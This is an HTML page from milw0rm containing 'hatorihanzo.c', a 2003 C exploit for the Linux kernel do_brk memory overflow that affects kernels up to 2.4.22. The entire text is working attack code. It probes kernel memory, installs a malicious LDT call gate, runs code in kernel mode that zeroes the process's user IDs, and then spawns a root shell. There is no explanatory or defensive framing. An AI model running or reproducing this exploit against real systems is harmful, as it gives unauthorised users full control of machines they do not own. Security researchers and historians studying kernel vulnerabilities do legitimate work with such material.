<html><head><title>Linux Kernel <= 2.4.22 (do_brk) Local Root Exploit (working)</title></head><pre>/*
* hatorihanzo.c
* Linux kernel do_brk vma overflow exploit.
*
* The bug was found by Paul (IhaQueR) Starzetz &lt;paul@isec.pl&gt;
*
* Further research and exploit development by
* Wojciech Purczynski &lt;cliph@isec.pl&gt; and Paul Starzetz.
*
* (c) 2003 Copyright by IhaQueR and cliph. All Rights Reserved.
*
* COPYING, PRINTING, DISTRIBUTION, MODIFICATION, COMPILATION AND ANY USE
* OF PRESENTED CODE IS STRICTLY PROHIBITED.
*/
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;paths.h&gt;
#include &lt;grp.h&gt;
#include &lt;setjmp.h&gt;
#include &lt;stdint.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/ipc.h&gt;
#include &lt;sys/shm.h&gt;
#include &lt;sys/ucontext.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;asm/ldt.h&gt;
#include &lt;asm/page.h&gt;
#include &lt;asm/segment.h&gt;
#include &lt;linux/unistd.h&gt;
#include &lt;linux/linkage.h&gt;
#define kB * 1024
#define MB * 1024 kB
#define GB * 1024 MB
#define MAGIC 0xdefaced /* I should've patented this number -cliph */
#define ENTRY_MAGIC 0
#define ENTRY_GATE 2
#define ENTRY_CS 4
#define ENTRY_DS 6
#define CS ((ENTRY_CS &lt;&lt; 2) | 4)
#define DS ((ENTRY_DS &lt;&lt; 2) | 4)
#define GATE ((ENTRY_GATE &lt;&lt; 2) | 4 | 3)
#define LDT_PAGES ((LDT_ENTRIES*LDT_ENTRY_SIZE+PAGE_SIZE-1) / PAGE_SIZE)
#define TOP_ADDR 0xFFFFE000U
/* configuration */
unsigned task_size;
unsigned page;
uid_t uid;
unsigned address;
int dontexit = 0;
void fatal(char * msg)
{
fprintf(stderr, &quot;[-] %s: %s\n&quot;, msg, strerror(errno));
if (dontexit) {
fprintf(stderr, &quot;[-] Unable to exit, entering neverending loop.\n&quot;);
kill(getpid(), SIGSTOP);
for (;;) pause();
}
exit(EXIT_FAILURE);
}
void configure(void)
{
unsigned val;
task_size = ((unsigned)&amp;val + 1 GB ) / (1 GB) * 1 GB;
uid = getuid();
}
void expand(void)
{
unsigned top = (unsigned) sbrk(0);
unsigned limit = address + PAGE_SIZE;
do {
if (sbrk(PAGE_SIZE) == NULL)
fatal(&quot;Kernel seems not to be vulnerable&quot;);
dontexit = 1;
top += PAGE_SIZE;
} while (top &lt; limit);
}
jmp_buf jmp;
#define MAP_NOPAGE 1
#define MAP_ISPAGE 2
void sigsegv(int signo, siginfo_t * si, void * ptr)
{
struct ucontext * uc = (struct ucontext *) ptr;
int error_code = uc-&gt;uc_mcontext.gregs[REG_ERR];
(void)signo;
(void)si;
error_code = MAP_NOPAGE + (error_code &amp; 1);
longjmp(jmp, error_code);
}
void prepare(void)
{
struct sigaction sa;
sa.sa_sigaction = sigsegv;
sa.sa_flags = SA_SIGINFO | SA_NOMASK;
sigemptyset(&amp;sa.sa_mask);
sigaction(SIGSEGV, &amp;sa, NULL);
}
int testaddr(unsigned addr)
{
int val;
val = setjmp(jmp);
if (val == 0) {
asm (&quot;verr (%%eax)&quot; : : &quot;a&quot; (addr));
return MAP_ISPAGE;
}
return val;
}
#define map_pages (((TOP_ADDR - task_size) + PAGE_SIZE - 1) / PAGE_SIZE)
#define map_size (map_pages + 8*sizeof(unsigned) - 1) / (8*sizeof(unsigned))
#define next(u, b) do { if ((b = 2*b) == 0) { b = 1; u++; } } while(0)
void map(unsigned * map)
{
unsigned addr = task_size;
unsigned bit = 1;
prepare();
while (addr &lt; TOP_ADDR) {
if (testaddr(addr) == MAP_ISPAGE)
*map |= bit;
addr += PAGE_SIZE;
next(map, bit);
}
signal(SIGSEGV, SIG_DFL);
}
void find(unsigned * m)
{
unsigned addr = task_size;
unsigned bit = 1;
unsigned count;
unsigned tmp;
prepare();
tmp = address = count = 0U;
while (addr &lt; TOP_ADDR) {
int val = testaddr(addr);
if (val == MAP_ISPAGE &amp;&amp; (*m &amp; bit) == 0) {
if (!tmp) tmp = addr;
count++;
} else {
if (tmp &amp;&amp; count == LDT_PAGES) {
errno = EAGAIN;
if (address)
fatal(&quot;double allocation\n&quot;);
address = tmp;
}
tmp = count = 0U;
}
addr += PAGE_SIZE;
next(m, bit);
}
signal(SIGSEGV, SIG_DFL);
if (address)
return;
errno = ENOTSUP;
fatal(&quot;Unable to determine kernel address&quot;);
}
int modify_ldt(int, void *, unsigned);
void ldt(unsigned * m)
{
struct modify_ldt_ldt_s l;
map(m);
memset(&amp;l, 0, sizeof(l));
l.entry_number = LDT_ENTRIES - 1;
l.seg_32bit = 1;
l.base_addr = MAGIC &gt;&gt; 16;
l.limit = MAGIC &amp; 0xffff;
if (modify_ldt(1, &amp;l, sizeof(l)) == -1)
fatal(&quot;Unable to set up LDT&quot;);
l.entry_number = ENTRY_MAGIC / 2;
if (modify_ldt(1, &amp;l, sizeof(l)) == -1)
fatal(&quot;Unable to set up LDT&quot;);
find(m);
}
asmlinkage void kernel(unsigned * task)
{
unsigned * addr = task;
/* looking for uids */
while (addr[0] != uid || addr[1] != uid ||
addr[2] != uid || addr[3] != uid)
addr++;
addr[0] = addr[1] = addr[2] = addr[3] = 0; /* uids */
addr[4] = addr[5] = addr[6] = addr[7] = 0; /* uids */
addr[8] = 0;
/* looking for vma */
for (addr = (unsigned *) task_size; addr; addr++) {
if (addr[0] &gt;= task_size &amp;&amp; addr[1] &lt; task_size &amp;&amp;
addr[2] == address &amp;&amp; addr[3] &gt;= task_size) {
addr[2] = task_size - PAGE_SIZE;
addr = (unsigned *) addr[3];
addr[1] = task_size - PAGE_SIZE;
addr[2] = task_size;
break;
}
}
}
void kcode(void);
#define __str(s) #s
#define str(s) __str(s)
void __kcode(void)
{
asm(
&quot;kcode: \n&quot;
&quot; pusha \n&quot;
&quot; pushl %es \n&quot;
&quot; pushl %ds \n&quot;
&quot; movl $(&quot; str(DS) &quot;) ,%edx \n&quot;
&quot; movl %edx,%es \n&quot;
&quot; movl %edx,%ds \n&quot;
&quot; movl $0xffffe000,%eax \n&quot;
&quot; andl %esp,%eax \n&quot;
&quot; pushl %eax \n&quot;
&quot; call kernel \n&quot;
&quot; addl $4, %esp \n&quot;
&quot; popl %ds \n&quot;
&quot; popl %es \n&quot;
&quot; popa \n&quot;
&quot; lret \n&quot;
);
}
void knockout(void)
{
unsigned * addr = (unsigned *) address;
if (mprotect(addr, PAGE_SIZE, PROT_READ|PROT_WRITE) == -1)
fatal(&quot;Unable to change page protection&quot;);
errno = ESRCH;
if (addr[ENTRY_MAGIC] != MAGIC)
fatal(&quot;Invalid LDT entry&quot;);
/* setting call gate and privileged descriptors */
addr[ENTRY_GATE+0] = ((unsigned)CS &lt;&lt; 16) | ((unsigned)kcode &amp; 0xffffU);
addr[ENTRY_GATE+1] = ((unsigned)kcode &amp; ~0xffffU) | 0xec00U;
addr[ENTRY_CS+0] = 0x0000ffffU; /* kernel 4GB code at 0x00000000 */
addr[ENTRY_CS+1] = 0x00cf9a00U;
addr[ENTRY_DS+0] = 0x0000ffffU; /* user 4GB code at 0x00000000 */
addr[ENTRY_DS+1] = 0x00cf9200U;
prepare();
if (setjmp(jmp) != 0) {
errno = ENOEXEC;
fatal(&quot;Unable to jump to call gate&quot;);
}
asm(&quot;lcall $&quot; str(GATE) &quot;,$0x0&quot;); /* this is it */
}
void shell(void)
{
char * argv[] = { _PATH_BSHELL, NULL };
execve(_PATH_BSHELL, argv, environ);
fatal(&quot;Unable to spawn shell\n&quot;);
}
void remap(void)
{
static char stack[8 MB]; /* new stack */
static char * envp[] = { &quot;PATH=&quot; _PATH_STDPATH, NULL };
static unsigned * m;
static unsigned b;
m = (unsigned *) sbrk(map_size);
if (!m)
fatal(&quot;Unable to allocate memory&quot;);
environ = envp;
asm (&quot;movl %0, %%esp\n&quot; : : &quot;a&quot; (stack + sizeof(stack)));
b = ((unsigned)sbrk(0) + PAGE_SIZE - 1) &amp; PAGE_MASK;
if (munmap((void*)b, task_size - b) == -1)
fatal(&quot;Unable to unmap stack&quot;);
while (b &lt; task_size) {
if (sbrk(PAGE_SIZE) == NULL)
fatal(&quot;Unable to expand BSS&quot;);
b += PAGE_SIZE;
}
ldt(m);
expand();
knockout();
shell();
}
int main(void)
{
configure();
remap();
return EXIT_FAILURE;
}


// milw0rm.com [2003-12-05]</pre></html>